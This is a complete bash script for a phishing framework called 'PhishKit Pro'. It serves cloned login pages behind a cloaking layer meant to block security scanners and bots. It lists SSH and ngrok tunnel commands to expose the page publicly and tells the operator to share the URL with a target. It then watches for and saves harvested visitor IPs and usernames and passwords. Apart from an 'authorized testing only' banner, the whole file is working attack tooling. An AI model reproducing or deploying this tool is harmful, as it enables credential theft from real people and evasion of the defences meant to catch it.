#!/bin/bash

# PhishKit Pro — Evasion-Enhanced Phishing Framework
# For Authorized Security Testing Only

RED='\033[1;31m'; GREEN='\033[1;32m'; BLUE='\033[1;34m'
YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; NC='\033[0m'

HOST="127.0.0.1"
PORT="8080"
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    clear
    echo -e "${RED}"
    echo "  ____  _     _     _    _ _ _   _ "
    echo " |  _ \| |__ (_)___| | _(_) | |_| |"
    echo " | |_) | '_ \| / __| |/ / | | __| |"
    echo " |  __/| | | | \__ \   <| | | |_|_|"
    echo " |_|   |_| |_|_|___/_|\_\_|_|\__(_)"
    echo -e "${NC}"
    echo -e "${CYAN}  PhishKit Pro v3.0 — Anti-Detection Framework${NC}"
    echo -e "${YELLOW}  For Authorized Security Testing Only${NC}"
    echo ""
}

list_templates() {
    echo -e "${BLUE}[+] Available Templates:${NC}\n"
    local i=1
    for site in "$BASE_DIR/.sites"/*/; do
        name=$(basename "$site")
        # Skip cloak-only directories
        [[ "$name" == _* ]] && continue
        echo -e "  ${GREEN}$i)${NC} $name"
        i=$((i+1))
    done
    echo ""
}

setup_site() {
    local site_name="$1"
    local site_dir="$BASE_DIR/.sites/$site_name"
    local www_dir="$BASE_DIR/.server/www"
    
    mkdir -p "$www_dir"
    rm -rf "$www_dir"/*
    
    echo -e "${BLUE}[+] Setting up cloaked phishing page for: ${WHITE}$site_name${NC}"
    
    # Copy template files + cloaking module
    cp -r "$site_dir"/* "$www_dir/"
    cp "$BASE_DIR/.sites/_cloak.php" "$www_dir/"
    
    # Create .htaccess for Apache-style URL rewriting (optional)
    cat > "$www_dir/.htaccess" << 'EOF'
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^login$ login.php [L]
    RewriteRule ^capture$ login.php [L]
</IfModule>
EOF
    
    echo -e "${BLUE}[+] Starting PHP server on ${WHITE}$HOST:$PORT${NC}"
    cd "$www_dir" && php -S "$HOST:$PORT" > /dev/null 2>&1 &
    local pid=$!
    sleep 1
    
    # Verify it started
    if kill -0 $pid 2>/dev/null; then
        echo -e "${GREEN}[+] Server running at: http://$HOST:$PORT${NC}"
    else
        echo -e "${RED}[-] Failed to start PHP server. Is PHP installed?${NC}"
        exit 1
    fi
}

tunnel_options() {
    echo ""
    echo -e "${CYAN}=== Tunnel Options (for external access) ===${NC}"
    echo -e "  ${YELLOW}1)${NC} Serveo (SSH, no install):"
    echo -e "     ${WHITE}ssh -R 80:localhost:$PORT serveo.net${NC}"
    echo -e "  ${YELLOW}2)${NC} Ngrok:"
    echo -e "     ${WHITE}ngrok http $PORT${NC}"
    echo -e "  ${YELLOW}3)${NC} Cloudflared:"
    echo -e "     ${WHITE}cloudflared tunnel --url http://localhost:$PORT${NC}"
    echo -e "  ${YELLOW}4)${NC} Localhost.run:"
    echo -e "     ${WHITE}ssh -R 80:localhost:$PORT nokey@localhost.run${NC}"
    echo ""
}

monitor() {
    local www_dir="$BASE_DIR/.server/www"
    local auth_dir="$BASE_DIR/auth"
    mkdir -p "$auth_dir"
    
    echo -e "${YELLOW}[*] Monitoring for credentials... (Ctrl+C to stop)${NC}"
    echo -e "${YELLOW}[*] Captured data will be saved to: $auth_dir${NC}\n"
    
    local last_ip_count=0
    local last_cred_count=0
    
    while true; do
        # Monitor IPs
        if [[ -f "$www_dir/ip.txt" ]]; then
            local current_lines=$(wc -l < "$www_dir/ip.txt" 2>/dev/null || echo 0)
            if (( current_lines > last_ip_count )); then
                echo -e "${RED}[!] ${BLUE}New visitor(s) detected!${NC}"
                tail -n +$((last_ip_count + 1)) "$www_dir/ip.txt" | while read -r line; do
                    [[ -n "$line" ]] && echo -e "  ${CYAN}>${NC} $line"
                done
                cat "$www_dir/ip.txt" >> "$auth_dir/ip_log.txt" 2>/dev/null
                last_ip_count=$current_lines
            fi
        fi
        
        # Monitor credentials
        if [[ -f "$www_dir/usernames.txt" ]]; then
            local current_cred_lines=$(wc -l < "$www_dir/usernames.txt" 2>/dev/null || echo 0)
            if (( current_cred_lines > last_cred_count )); then
                echo -e "${RED}[!] ${GREEN}************************************${NC}"
                echo -e "${RED}[!] ${GREEN}CREDENTIALS CAPTURED!${NC}"
                echo -e "${RED}[!] ${GREEN}************************************${NC}"
                tail -n +$((last_cred_count + 1)) "$www_dir/usernames.txt" | while read -r line; do
                    [[ -n "$line" ]] && echo -e "  ${WHITE}$line${NC}"
                done
                cp "$www_dir/usernames.txt" "$auth_dir/credentials.txt" 2>/dev/null
                last_cred_count=$current_cred_lines
                echo ""
            fi
        fi
        
        sleep 0.5
    done
}

cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    rm -rf "$BASE_DIR/.server"
    echo -e "${GREEN}[+] Done.${NC}"
    exit 0
}

main() {
    banner
    list_templates
    
    echo -ne "${CYAN}[?] Select template number: ${NC}"
    read choice
    
    local i=1
    local selected=""
    for site in "$BASE_DIR/.sites"/*/; do
        name=$(basename "$site")
        [[ "$name" == _* ]] && continue
        if [[ $i -eq $choice ]]; then
            selected="$name"
            break
        fi
        i=$((i+1))
    done
    
    if [[ -z "$selected" ]]; then
        echo -e "${RED}[-] Invalid selection${NC}"
        exit 1
    fi
    
    trap cleanup EXIT INT TERM
    
    setup_site "$selected"
    tunnel_options
    
    echo -e "${GREEN}[+] Share this URL with your target: http://$HOST:$PORT${NC}"
    echo -e "${YELLOW}[!] Note: The cloaking layer will block scanners and bots.${NC}"
    echo -e "${YELLOW}[!] Real users will see the login page after JavaScript verification.${NC}"
    echo ""
    echo -ne "${CYAN}[?] Press Enter to start monitoring...${NC}"
    read
    
    monitor
}

main